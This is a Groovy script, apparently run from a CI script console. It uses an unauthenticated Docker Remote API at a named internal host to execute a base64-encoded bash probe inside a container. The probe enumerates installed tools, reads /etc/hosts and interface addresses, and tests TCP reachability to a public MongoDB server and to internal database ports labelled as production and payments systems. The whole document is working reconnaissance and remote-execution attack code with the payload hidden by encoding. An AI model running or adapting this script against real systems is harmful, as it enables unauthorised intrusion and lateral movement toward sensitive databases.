import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"

def cmd = '''
echo "=== WHICH ==="
which python python2 python3 php mongosh mongo node 2>/dev/null
echo "=== PYTHON VERSION ==="
python --version 2>&1; python2 --version 2>&1; python3 --version 3>&1
echo "=== PYMONGO ==="
python -c "import pymongo; print('pymongo', pymongo.version)" 2>&1
python2 -c "import pymongo; print('pymongo2', pymongo.version)" 2>&1
echo "=== PHP MONGO ==="
php -m 2>/dev/null | grep -i mongo
php --version 2>&1 | head -2
echo "=== DNS TOOLS ==="
which nslookup dig host 2>/dev/null
echo "=== NET TEST ==="
(timeout 5 bash -c "echo > /dev/tcp/3.231.83.29/27017" && echo "PUBLIC_3.231.83.29:27017 OK") 2>&1
(timeout 5 bash -c "echo > /dev/tcp/172.26.84.132/27021" && echo "INTERNAL_172.26.84.132:27021 OK") 2>&1
(timeout 5 bash -c "echo > /dev/tcp/172.27.141.24/3308" && echo "PROD_SEARS_172.27.141.24:3308 OK") 2>&1
(timeout 5 bash -c "echo > /dev/tcp/172.27.141.4/3310" && echo "T1PAGOS_172.27.141.4:3310 OK") 2>&1
echo "=== HOSTNAME/IP ==="
hostname
cat /etc/hosts | head -20
ip addr 2>/dev/null | grep "inet " || ifconfig 2>/dev/null | grep "inet "
echo "=== DONE ==="
'''

def b64 = java.util.Base64.encoder.encodeToString(cmd.getBytes("UTF-8"))
def url = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def conn = url.openConnection()
conn.setRequestMethod("POST"); conn.setDoOutput(true)
conn.setRequestProperty("Content-Type", "application/json")
def body = JsonOutput.toJson([AttachStdout:true, AttachStderr:true, Cmd:["bash","-c","echo ${b64} | base64 -d > /tmp/probe.sh && bash /tmp/probe.sh"]])
conn.outputStream.write(body.bytes); conn.outputStream.flush()
def r = new JsonSlurper().parseText(conn.inputStream.text)
def eid = r.Id
def su = new URL("http://${dHost}:${dPort}/exec/${eid}/start").openConnection()
su.setRequestMethod("POST"); su.setDoOutput(true)
su.setRequestProperty("Content-Type", "application/json")
su.outputStream.write('{"Detach":false,"Tty":true}'.bytes); su.outputStream.flush()
println su.inputStream.text
